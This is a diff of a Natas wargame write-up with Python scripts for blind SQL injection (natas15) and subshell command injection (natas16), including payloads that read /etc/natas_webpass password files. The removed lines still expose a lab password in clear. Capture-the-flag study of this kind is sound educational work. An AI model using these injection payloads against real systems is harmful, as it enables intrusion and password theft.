@@ -15,7 +15,7 @@ passwd = ""
 
 for char in chars:
     input_data = {'username' : 'natas16" and password LIKE BINARY "%{}%" # '.format(char)}
-    r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = input_data)
+    r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', '<censored>'), data = input_data)
     if "exists" in r.text:
         filtered += char
 
@@ -24,12 +24,43 @@ print(filtered)
 for _ in range(0, 32):
     for char in filtered:
         input_data = {'username' : 'natas16" and password LIKE BINARY "{}%" # '.format(passwd + char)}
-        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = input_data)
+        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', '<censored>'), data = input_data)
         if "exists" in r.text:
             passwd += char
             print(passwd)
             break
 ```
+### natas16
+
+Another brute force though not using SQL injection. There is a filter on common escape sequences (dunno what theyre called) but not on $(). This creates a subshell which can be used to run a command. There are 2 ways to solve this, one of them I do not really understand but oh well. I think prints the file to standard output `$(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1)` $$ is the process id of the bash shell and /fd/1 is the standard ouput. So when running the command it is as if running the command not through a subshell.
+ 
+The other method is a bruteforce. by grepping a single character through a subshell we can determine whether it exists in the password. By adding a word directly at the end of the sub-shell command we can determine whether the character is present by checking the response for that word. Example: `grep -i $(grep a /etc/natas_webpass/natas17)doomed dictionary.txt` if `a` was present in the password, it will result in `grep -i adoomed dictionary.txt` being executed by the server. `adoomed` is not a word and therefore would not match. If we use a script to cycle through each potential character and check everytime `doomed` is not present in the response, we would that the character is in the password. Script below.
+
+```py
+import requests
+from requests.auth import HTTPBasicAuth
+
+chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+filtered = ""
+passwd = ""
+
+for char in chars:
+    input_data = {'needle': '$(grep {} /etc/natas_webpass/natas17)doomed'.format(char),'submit' : 'Search'}
+    r = requests.get("http://natas16.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas16', '<censored>'), params=input_data)
+    if "Output:\n<pre>\n</pre>" in r.text:
+        filtered += char
+
+print(filtered)
+
+for _ in range(0, 32):
+    for char in filtered:
+        input_data = {'needle': '$(grep ^{} /etc/natas_webpass/natas17)doomed'.format(passwd + char),'submit' : 'Search'}
+        r = requests.get("http://natas16.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas16', '<censored>'), params=input_data)
+        if "Output:\n<pre>\n</pre>" in r.text:
+            passwd += char
+            print(passwd,'*' * int(32 - len(passwd)))
+            break
+```   
 
 ### natas17
 
